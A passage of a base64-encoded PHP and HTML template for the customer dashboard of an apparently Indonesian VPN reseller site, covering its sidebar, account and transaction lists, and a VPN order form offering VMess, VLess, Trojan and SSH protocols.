CAgICAgICAgIC5ha3VuLWl0ZW0geyBmbGV4LWRpcmVjdGlvbjpjb2x1bW47IGFsaWduLWl0ZW1zOmZsZXgtc3RhcnQ7IH0KICAgICAgICAgICAgLmFrdW4tYWN0aW9ucyB7IHdpZHRoOjEwMCU7IGp1c3RpZnktY29udGVudDpmbGV4LWVuZDsgfQogICAgICAgIH0KICAgICAgICBAbWVkaWEobWF4LXdpZHRoOjQ4MHB4KSB7CiAgICAgICAgICAgIC5zdGF0cyB7IGdyaWQtdGVtcGxhdGUtY29sdW1uczogMWZyOyB9CiAgICAgICAgICAgIC50b3BiYXIgeyBmbGV4LWRpcmVjdGlvbjpjb2x1bW47IGFsaWduLWl0ZW1zOmZsZXgtc3RhcnQ7IH0KICAgICAgICB9Cjwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+Cgo8IS0tIFNpZGViYXIgLS0+Cjxhc2lkZSBjbGFzcz0ic2lkZWJhciIgaWQ9InNpZGViYXIiPgogIDxkaXYgY2xhc3M9InNpZGViYXItbG9nbyI+CiAgICA8c3ZnIHdpZHRoPSIzNiIgaGVpZ2h0PSIzNiIgdmlld0JveD0iMCAwIDM2IDM2IiBzdHlsZT0iZmxleC1zaHJpbms6MCI+CiAgICAgICAgICAgIDxkZWZzPgogICAgICAgICAgICAgICAgPGxpbmVhckdyYWRpZW50IGlkPSJkYXNoLWxvZ28tZ3JhZCIgeDE9IjAlIiB5MT0iMCUiIHgyPSIxMDAlIiB5Mj0iMTAwJSI+CiAgICAgICAgICAgICAgICAgICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3R5bGU9InN0b3AtY29sb3I6IzdjNWNmYztzdG9wLW9wYWNpdHk6MSIgLz4KICAgICAgICAgICAgICAgICAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0eWxlPSJzdG9wLWNvbG9yOiM0YTMwYjA7c3RvcC1vcGFjaXR5OjEiIC8+CiAgICAgICAgICAgICAgICA8L2xpbmVhckdyYWRpZW50PgogICAgICAgICAgICA8L2RlZnM+CiAgICAgICAgICAgIDxyZWN0IHdpZHRoPSIzNiIgaGVpZ2h0PSIzNiIgcng9IjgiIGZpbGw9InVybCgjZGFzaC1sb2dvLWdyYWQpIi8+CiAgICAgICAgICAgIDx0ZXh0IHg9IjE4IiB5PSIyNCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iMTYiIGZvbnQtd2VpZ2h0PSI3MDAiIGZvbnQtZmFtaWx5PSJTZWdvZSBVSSxzeXN0ZW0tdWksc2Fucy1zZXJpZiI+VjwvdGV4dD4KICAgICAgICAgICAgPGNpcmNsZSBjeD0iMjciIGN5PSIxMCIgcj0iNSIgZmlsbD0iI2ZmZDcwMCIgb3BhY2l0eT0iMC45Ii8+CiAgICAgICAgICAgIDx0ZXh0IHg9IjI3IiB5PSIxMyIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzMwMmI2MyIgZm9udC1zaXplPSI3IiBmb250LXdlaWdodD0iOTAwIiBmb250LWZhbWlseT0iU2Vnb2UgVUksc3lzdGVtLXVpLHNhbnMtc2VyaWYiPlA8L3RleHQ+CiAgICAgICAgPC9zdmc+CiAgICA8ZGl2PjxoMT48Pz0kYXBwTmFtZT8+PC9oMT48cD5QcmVtaXVtIFZQTiBTZXJ2aWNlPC9wPjwvZGl2PgogIDwvZGl2PgogIDxuYXY+CiAgICA8ZGl2IGNsYXNzPSJuYXYtc2VjdGlvbiI+TWVudTwvZGl2PgogICAgPGJ1dHRvbiBjbGFzcz0ibmF2LWl0ZW0gYWN0aXZlIiBvbmNsaWNrPSJzaG93UGFnZSgnaG9tZScpIj48c3BhbiBjbGFzcz0iaWNvbiI+W0hPTUVdPC9zcGFuPiBEYXNoYm9hcmQ8L2J1dHRvbj4KICAgIDxidXR0b24gY2xhc3M9Im5hdi1pdGVtIiBvbmNsaWNrPSJzaG93UGFnZSgnb3JkZXInKSI+PHNwYW4gY2xhc3M9Imljb24iPltDQVJUXTwvc3Bhbj4gT3JkZXIgVlBOPC9idXR0b24+CiAgICA8YnV0dG9uIGNsYXNzPSJuYXYtaXRlbSIgb25jbGljaz0ic2hvd1BhZ2UoJ2FrdW4nKSI+PHNwYW4gY2xhc3M9Imljb24iPltDTElQXTwvc3Bhbj4gQWt1biBWUE4gPHNwYW4gY2xhc3M9Im5hdi1iYWRnZSI+PD89JHRvdGFsQWt1bj8+PC9zcGFuPjwvYnV0dG9uPgogICAgPGJ1dHRvbiBjbGFzcz0ibmF2LWl0ZW0iIG9uY2xpY2s9InNob3dQYWdlKCd0b3B1cCcpIj48c3BhbiBjbGFzcz0iaWNvbiI+W01PTkVZXTwvc3Bhbj4gSXNpIFNhbGRvPC9idXR0b24+CiAgICA8ZGl2IGNsYXNzPSJuYXYtc2VjdGlvbiI+SW5mbzwvZGl2PgogICAgPGJ1dHRvbiBjbGFzcz0ibmF2LWl0ZW0iIG9uY2xpY2s9InNob3dQYWdlKCdzZXJ2ZXInKSI+PHNwYW4gY2xhc3M9Imljb24iPltHTE9CRV08L3NwYW4+IFN0YXR1cyBTZXJ2ZXI8L2J1dHRvbj4KICAgIDxidXR0b24gY2xhc3M9Im5hdi1pdGVtIiBvbmNsaWNrPSJzaG93UGFnZSgncml3YXlhdCcpIj48c3BhbiBjbGFzcz0iaWNvbiI+W0NIQVJUXTwvc3Bhbj4gUml3YXlhdDwvYnV0dG9uPgogICAgPGJ1dHRvbiBjbGFzcz0ibmF2LWl0ZW0iIG9uY2xpY2s9InNob3dQYWdlKCdzZXR0aW5nJykiPjxzcGFuIGNsYXNzPSJpY29uIj5bR0VBUl08L3NwYW4+IFNldHRpbmcgQWt1bjwvYnV0dG9uPgogICAgPD9waHAgaWYoJHJvbGU9PT0nYWRtaW4nKTo/PgogICAgPGRpdiBjbGFzcz0ibmF2LXNlY3Rpb24iPkFkbWluPC9kaXY+CiAgICA8YSBjbGFzcz0ibmF2LWl0ZW0iIGhyZWY9Ii9vcmRlcnZwbi9hZG1pbi8iPjxzcGFuIGNsYXNzPSJpY29uIj5bVE9PTF08L3NwYW4+IEFkbWluIFBhbmVsPC9hPgogICAgPD9waHAgZW5kaWY7Pz4KICA8L25hdj4KICA8ZGl2IGNsYXNzPSJzaWRlYmFyLWZvb3RlciI+CiAgICA8ZGl2IGNsYXNzPSJ1c2VyLWNhcmQiPgogICAgICA8ZGl2IGNsYXNzPSJ1c2VyLWF2YXRhciI+PD89c3RydG91cHBlcihzdWJzdHIoJHVzZXJuYW1lLDAsMSkpPz48L2Rpdj4KICAgICAgPGRpdj48ZGl2IGNsYXNzPSJ1c2VyLW5hbWUiPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHVzZXJuYW1lKT8+PC9kaXY+CiAgICAgICAgICAgPGRpdiBjbGFzcz0idXNlci1yb2xlIj48Pz0kcm9sZT09PSdhZG1pbic/J1tDUk9XTl0gQWRtaW4nOidbVVNFUl0gVXNlcic/PjwvZGl2PjwvZGl2PgogICAgPC9kaXY+CiAgICA8YSBocmVmPSIvb3JkZXJ2cG4vYXBpL2xvZ291dC5waHAiIGNsYXNzPSJuYXYtaXRlbSIgc3R5bGU9Im1hcmdpbi10b3A6Ljc1cmVtO2NvbG9yOnZhcigtLXJlZCkiPjxzcGFuIGNsYXNzPSJpY29uIj5bRE9PUl08L3NwYW4+IExvZ291dDwvYT4KICA8L2Rpdj4KPC9hc2lkZT4KCjwhLS0gTWFpbiAtLT4KPGRpdiBjbGFzcz0ibWFpbiI+CiAgPGRpdiBjbGFzcz0idG9wYmFyIj4KICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7Z2FwOi43NXJlbSI+CiAgICAgIDxidXR0b24gY2xhc3M9ImhhbWJ1cmdlciIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NpZGViYXInKS5jbGFzc0xpc3QudG9nZ2xlKCdvcGVuJykiPls9XTwvYnV0dG9uPgogICAgICA8c3BhbiBjbGFzcz0idG9wYmFyLXRpdGxlIiBpZD0icGFnZVRpdGxlIj5EYXNoYm9hcmQ8L3NwYW4+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9InNhbGRvLWNoaXAiPltNT05FWV0gPD89Zm9ybWF0UnVwaWFoKCR1c2VyWydzYWxkbyddKT8+PC9kaXY+CiAgPC9kaXY+CgogIDxkaXYgY2xhc3M9ImNvbnRlbnQiPgoKICAgIDwhLS0gQUxFUlQgLS0+CiAgICA8ZGl2IGlkPSJwYWdlQWxlcnQiPjwvZGl2PgoKICAgIDwhLS0gUEFHRTogSE9NRSAtLT4KICAgIDxkaXYgaWQ9InBhZ2UtaG9tZSI+CiAgICAgIDxkaXYgY2xhc3M9InN0YXRzIj4KICAgICAgICA8ZGl2IGNsYXNzPSJzdGF0LWNhcmQgYmx1ZSI+PGRpdiBjbGFzcz0ic3RhdC1pY29uIj5bU0lHXTwvZGl2PjxkaXYgY2xhc3M9InN0YXQtdmFsIj48Pz0kdG90YWxBa3VuPz48L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LWxhYmVsIj5Ba3VuIEFrdGlmPC9kaXY+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0ic3RhdC1jYXJkIGdyZWVuIj48ZGl2IGNsYXNzPSJzdGF0LWljb24iPltNT05FWV08L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LXZhbCI+PD89Zm9ybWF0UnVwaWFoKCR1c2VyWydzYWxkbyddKT8+PC9kaXY+PGRpdiBjbGFzcz0ic3RhdC1sYWJlbCI+U2FsZG88L2Rpdj48L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJzdGF0LWNhcmQgcHVycGxlIj48ZGl2IGNsYXNzPSJzdGF0LWljb24iPltDSEFSVF08L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LXZhbCI+PD89JHRvdGFsVHJ4Pz48L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LWxhYmVsIj5Ub3RhbCBUcmFuc2Frc2k8L2Rpdj48L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJzdGF0LWNhcmQgeWVsbG93Ij48ZGl2IGNsYXNzPSJzdGF0LWljb24iPltDQVJEXTwvZGl2PjxkaXYgY2xhc3M9InN0YXQtdmFsIj48Pz1mb3JtYXRSdXBpYWgoJHRvdGFsVG9wdXApPz48L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LWxhYmVsIj5Ub3RhbCBUb3B1cDwvZGl2PjwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPltDTElQXSBBa3VuIEFrdGlmPC9kaXY+PGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgb25jbGljaz0ic2hvd1BhZ2UoJ29yZGVyJykiPisgT3JkZXIgQmFydTwvYnV0dG9uPjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICA8P3BocCBpZihlbXB0eSgkYWt1bnMpKTo/PgogICAgICAgICAgPGRpdiBjbGFzcz0iZW1wdHktc3RhdGUiPjxkaXYgY2xhc3M9Imljb24iPltTSUddPC9kaXY+PHA+QmVsdW0gYWRhIGFrdW4gVlBOIGFrdGlmPC9wPjxicj48YnV0dG9uIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiIG9uY2xpY2s9InNob3dQYWdlKCdvcmRlcicpIj5PcmRlciBTZWthcmFuZzwvYnV0dG9uPjwvZGl2PgogICAgICAgICAgPD9waHAgZWxzZTogZm9yZWFjaCgkYWt1bnMgYXMgJGEpOgogICAgICAgICAgICAkZXhwID0gc3RydG90aW1lKCRhWydtYXNhX2FrdGlmJ10pOwogICAgICAgICAgICAkc2lzYSA9IGNlaWwoKCRleHAgLSB0aW1lKCkpLzg2NDAwKTsKICAgICAgICAgICAgJGV4cENsYXNzID0gJHNpc2EgPiA3ID8gJ2V4cC1vaycgOiAoJHNpc2EgPiAzID8gJ2V4cC13YXJuJyA6ICdleHAtZGFuZ2VyJyk7CiAgICAgICAgICA/PgogICAgICAgICAgPGRpdiBjbGFzcz0iYWt1bi1pdGVtIiBvbmNsaWNrPSJzaG93QWt1bkRldGFpbCg8Pz1qc29uX2VuY29kZSgkYSk/PikiIHN0eWxlPSJjdXJzb3I6cG9pbnRlciI+CiAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJha3VuLWJhZGdlIGJhZGdlLTw/PSRhWyd0aXBlJ10/PiI+PD89c3RydG91cHBlcigkYVsndGlwZSddKT8+PC9zcGFuPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJha3VuLWluZm8iPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFrdW4tbmFtZSI+PD89aHRtbHNwZWNpYWxjaGFycygkYVsndXNlcm5hbWUnXSk/PjwvZGl2PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFrdW4tbWV0YSI+PD89JGFbJ2ZsYWcnXT8/J/Cfh67wn4epJz8+IDw/PWh0bWxzcGVjaWFsY2hhcnMoJGFbJ25hbWFfc2VydmVyJ10pPz48L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFrdW4tZXhwIDw/PSRleHBDbGFzcz8+Ij48Pz0kYVsnaXNfdHJpYWwnXT8n4o+xIFRyaWFsJzon4o+zICcuJHNpc2EuJyBoYXJpJz8+PC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDw/cGhwIGVuZGZvcmVhY2g7IGVuZGlmOz8+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+W0NIQVJUXSBUcmFuc2Frc2kgVGVyYmFydTwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICA8P3BocCBpZihlbXB0eSgkdHJ4cykpOj8+PGRpdiBjbGFzcz0iZW1wdHktc3RhdGUiPjxkaXYgY2xhc3M9Imljb24iPltDSEFSVF08L2Rpdj48cD5CZWx1bSBhZGEgdHJhbnNha3NpPC9wPjwvZGl2PgogICAgICAgICAgPD9waHAgZWxzZTogZm9yZWFjaCgkdHJ4cyBhcyAkdCk6Pz4KICAgICAgICAgIDxkaXYgY2xhc3M9InRyeC1pdGVtIHRyeC08Pz0kdFsndHlwZSddPz4iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cngtaWNvbiI+PD89JHRbJ3R5cGUnXT09PSd0b3B1cCc/J+Kshic6J+Kshyc/PjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cngtaW5mbyI+PGRpdiBjbGFzcz0idHJ4LWRlc2MiPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHRbJ2tldGVyYW5nYW4nXT8/JHRbJ3R5cGUnXSk/PjwvZGl2PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRyeC1kYXRlIj48Pz1kYXRlKCdkIE0gWSwgSDppJyxzdHJ0b3RpbWUoJHRbJ2NyZWF0ZWRfYXQnXSkpPz48L2Rpdj48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0idHJ4LWFtb3VudCIgc3R5bGU9ImNvbG9yOjw/PSR0Wyd0eXBlJ109PT0ndG9wdXAnPyd2YXIoLS1ncmVlbiknOid2YXIoLS1yZWQpJz8+Ij48Pz0kdFsndHlwZSddPT09J3RvcHVwJz8nKyc6Jy0nPz48Pz1mb3JtYXRSdXBpYWgoJHRbJ2Ftb3VudCddKT8+PC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDw/cGhwIGVuZGZvcmVhY2g7IGVuZGlmOz8+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPCEtLSBQQUdFOiBPUkRFUiAtLT4KICAgIDxkaXYgaWQ9InBhZ2Utb3JkZXIiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+W0NBUlRdIE9yZGVyIFZQTjwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICA8P3BocCBpZihlbXB0eSgkc2VydmVycykpOj8+PGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtZXJyb3IiPlRpZGFrIGFkYSBzZXJ2ZXIgdGVyc2VkaWEgc2FhdCBpbmkuPC9kaXY+CiAgICAgICAgICA8P3BocCBlbHNlOj8+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgY2xhc3M9ImxibCI+UGlsaWggU2VydmVyPC9sYWJlbD4KICAgICAgICAgICAgPHNlbGVjdCBpZD0ib3JkZXJTZXJ2ZXIiPgogICAgICAgICAgICAgIDw/cGhwIGZvcmVhY2goJHNlcnZlcnMgYXMgJHMpOj8+CiAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iPD89JHNbJ2lkJ10/PiIgZGF0YS1oYXJnYS1oYXJpPSI8Pz0kc1snaGFyZ2FfaGFyaSddPz4iIGRhdGEtaGFyZ2EtYnVsYW49Ijw/PSRzWydoYXJnYV9idWxhbiddPz4iIGRhdGEtbmFtZT0iPD89aHRtbHNwZWNpYWxjaGFycygkc1snbmFtYV9zZXJ2ZXInXSk/PiI+PD89JHNbJ2ZsYWcnXT8/J/Cfh67wn4epJz8+IDw/PWh0bWxzcGVjaWFsY2hhcnMoJHNbJ25hbWFfc2VydmVyJ10pPz4g4oCUIDw/PWh0bWxzcGVjaWFsY2hhcnMoJHNbJ2xva2FzaSddKT8+PC9vcHRpb24+CiAgICAgICAgICAgICAgPD9waHAgZW5kZm9yZWFjaDs/PgogICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPlByb3Rva29sPC9sYWJlbD4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icHJvdG8tZ3JpZCI+CiAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icHJvdG8tYnRuIGFjdGl2ZSIgZGF0YS1wcm90bz0idm1lc3MiIG9uY2xpY2s9InNlbGVjdFByb3RvKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+W1BPV0VSXTwvc3Bhbj5WTWVzczwvYnV0dG9uPgogICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biIgZGF0YS1wcm90bz0idmxlc3MiIG9uY2xpY2s9InNlbGVjdFByb3RvKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+W0ZBU1RdPC9zcGFuPlZMZXNzPC9idXR0b24+CiAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icHJvdG8tYnRuIiBkYXRhLXByb3RvPSJ0cm9qYW4iIG9uY2xpY2s9InNlbGVjdFByb3RvKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+W1NISUVMRF08L3NwYW4+VHJvamFuPC9idXR0b24+CiAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icHJvdG8tYnRuIiBkYXRhLXByb3RvPSJzc2giIG9uY2xpY2s9InNlbGVjdFByb3RvKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+W1BBRExPQ0tdPC9zcGFuPlNTSDwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPkR1cmFzaTwvbGFiZWw+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InByb3RvLWdyaWQiPgogICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biBhY3RpdmUiIGRhdGEtZGF5cz0iNyIgb25jbGljaz0ic2VsZWN0RHVyYXRpb24odGhpcykiPjxzcGFuIGNsYXNzPSJpY29uIj5bREFURV08L3NwYW4+NyBIYXJpPC9idXR0b24+CiAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icHJvdG8tYnRuIiBkYXRhLWRheXM9IjMwIiBvbmNsaWNrPSJzZWxlY3REdXJhdGlvbih0aGlzKSI+PHNwYW4gY2xhc3M9Imljb24iPltDQUxdPC9zcGFuPjMwIEhhcmk8L2J1dHRvbj4KICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJwcm90by1idG4iIGRhdGEtZGF5cz0iNjAiIG9uY2xpY2s9InNlbGVjdER1cmF0aW9uKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+W0NBTF08L3NwYW4+NjAgSGFyaTwvYnV0dG9uPgogICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biIgZGF0YS1kYXlzPSI5MCIgb25jbGljaz0ic2VsZWN0RHVyYXRpb24odGhpcykiPjxzcGFuIGNsYXNzPSJpY29uIj5bREFURV08L3NwYW4+OTAgSGFyaTwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPlVzZXJuYW1lPC9sYWJlbD4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJvcmRlclVzZXJuYW1lIiBwbGFjZWhvbGRlcj0iQnVhdCB1c2VybmFtZSAoaHVydWYsIGFuZ2thLCBfKSIgb25pbnB1dD0idGhpcy52YWx1ZT10aGlzLnZhbHVlLnJlcGxhY2UoL1teYS16QS1aMC05X1wtXS9nLCcnKSI+PC9kaXY+CiAgICAgICAgICA8ZGl2IGlkPSJvcmRlckhhcmdhIiBzdHlsZT0iYmFja2dyb3VuZDojMGExNjI4O2JvcmRlcjoxcHggc29saWQgdmFyKC0tYm9yZGVyKTtib3JkZXItcmFkaXVzOjEwcHg7cGFkZGluZzoxcmVtO21hcmdpbjouNzVyZW0gMDtkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47YWxpZ24taXRlbXM6Y2VudGVyIj4KICAgICAgICAgICAgPHNwYW4gc3R5bGU9ImNvbG9yOnZhcigtLW11dGVkKTtmb250LXNpemU6Ljg3NXJlbSI+VG90YWwgSGFyZ2E8L3NwYW4+CiAgICAgICAgICAgIDxzcGFuIGlkPSJoYXJnYVZhbCIgc3R5bGU9ImZvbnQtc2l6ZToxLjFyZW07Zm9udC13ZWlnaHQ6ODAwO2NvbG9yOnZhcigtLWdyZWVuKSI+UnAgMDwvc3Bhbj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDouNzVyZW0iPgogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiIHN0eWxlPSJmbGV4OjEiIG9uY2xpY2s9ImRvT3JkZXIoKSI+PHNwYW4gaWQ9Im9yZGVyQnRuVHh0Ij5bQ0FSVF0gT3JkZXIgU2VrYXJhbmc8L3NwYW4+PC9idXR0b24+CiAgICAgICAgICAgIDw/cGhwIGlmKCR0cmlhbFVzZWQ9PT0wKTo/PgogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLW91dGxpbmUiIG9uY2xpY2s9InNob3dUcmlhbE1vZGFsKCkiIHRpdGxlPSJUcmlhbCAxIGphbSBncmF0aXMiPltQT1dFUl0gVHJpYWw8L2J1dHRvbj4KICAgICAgICAgICAgPD9waHAgZW5kaWY7Pz4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPD9waHAgZW5kaWY7Pz4KICAgICAgICAgIDxkaXYgaWQ9Im9yZGVyUmVzdWx0IiBjbGFzcz0icmVzdWx0LWJveCI+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPCEtLSBQQUdFOiBBS1VOIC0tPgogICAgPGRpdiBpZD0icGFnZS1ha3VuIiBzdHlsZT0iZGlzcGxheTpub25lIj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPltDTElQXSBTZW11YSBBa3VuIFZQTjwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSIgaWQ9ImFrdW5MaXN0Ij4KICAgICAgICAgIDw/cGhwCiAgICAgICAgICAkYWxsQWt1bnMgPSAkZGItPnByZXBhcmUoIlNFTEVDVCB2YS4qLCBzLm5hbWFfc2VydmVyLCBzLmZsYWcsIHMubG9rYXNpIEZST00gdnBuX2FjY291bnRzIHZhIEpPSU4gc2VydmVycyBzIE9OIHZhLnNlcnZlcl9pZD1zLmlkIFdIRVJFIHZhLnVzZXJfaWQ9PyBPUkRFUiBCWSB2YS5zdGF0dXMgQVNDLCB2YS5tYXNhX2FrdGlmIEFTQyIpOwogICAgICAgICAgJGFsbEFrdW5zLT5leGVjdXRlKFskdXNlcklkXSk7ICRhbGxBa3Vucz0kYWxsQWt1bnMtPmZldGNoQWxsKCk7CiAgICAgICAgICBpZihlbXB0eSgkYWxsQWt1bnMpKTo/PjxkaXYgY2xhc3M9ImVtcHR5LXN0YXRlIj48ZGl2IGNsYXNzPSJpY29uIj5bQ0xJUF08L2Rpdj48cD5CZWx1bSBhZGEgYWt1bjwvcD48L2Rpdj4KICAgICAgICAgIDw/cGhwIGVsc2U6IGZvcmVhY2goJGFsbEFrdW5zIGFzICRhKToKICAgICAgICAgICAgJGV4cD1zdHJ0b3RpbWUoJGFbJ21hc2FfYWt0aWYnXSk7ICRzaXNhPWNlaWwoKCRleHAtdGltZSgpKS84NjQwMCk7CiAgICAgICAgICAgICRleHBDbGFzcz0kc2lzYT43PydleHAtb2snOigkc2lzYT4zPydleHAtd2Fybic6J2V4cC1kYW5nZXInKTsKICAgICAgICAgID8+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJha3VuLWl0ZW0iPgogICAgICAgICAgICA8c3BhbiBjbGFzcz0iYWt1bi1iYWRnZSBiYWRnZS08Pz0kYVsndGlwZSddPz4iPjw/PXN0cnRvdXBwZXIoJGFbJ3RpcGUnXSk/Pjw/PSRhWydpc190cmlhbCddPycgW0dJRlRdJzonJz8+PC9zcGFuPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJha3VuLWluZm8iPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFrdW4tbmFtZSI+PD89aHRtbHNwZWNpYWxjaGFycygkYVsndXNlcm5hbWUnXSk/PjwvZGl2PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFrdW4tbWV0YSI+PD89JGFbJ2ZsYWcnXT8/J/Cfh67wn4epJz8+IDw/PWh0bWxzcGVjaWFsY2hhcnMoJGFbJ25hbWFfc2VydmVyJ10pPz4gwrcgPD89aHRtbHNwZWNpYWxjaGFycygkYVsnc3RhdHVzJ10pPz48L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47YWxpZ24taXRlbXM6ZmxleC1lbmQ7Z2FwOi4zcmVtIj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJha3VuLWV4cCA8Pz0kZXhwQ2xhc3M/PiI+PD89JGFbJ2lzX3RyaWFsJ10/J+KPsSBUcmlhbCc6KCRhWydzdGF0dXMnXT09PSdhY3RpdmUnPyfij7MgJy4kc2lzYS4nIGhhcmknOidbTk9dIEV4cGlyZWQnKT8+PC9kaXY+CiAgICAgICAgICAgICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDouMzVyZW0iPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZSIgb25jbGljaz0ic2hvd0FrdW5EZXRhaWwoPD89anNvbl9lbmNvZGUoJGEpPz4pIj5bRVlFXTwvYnV0dG9uPgogICAgICAgICAgICAgICAgPD9waHAgaWYoJGFbJ3N0YXR1cyddPT09J2FjdGl2ZScpOj8+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1yZWQiIG9uY2xpY2s9ImNvbmZpcm1EZWxldGUoPD89JGFbJ2lkJ10/PiwgJzw/PWh0bWxzcGVjaWFsY2hhcnMoJGFbJ3VzZXJuYW1lJ10pPz4nLCc8Pz0kYVsndGlwZSddPz4nKSI+W1RSQVNIXTwvYnV0dG9uPgogICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7Pz4KICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgIC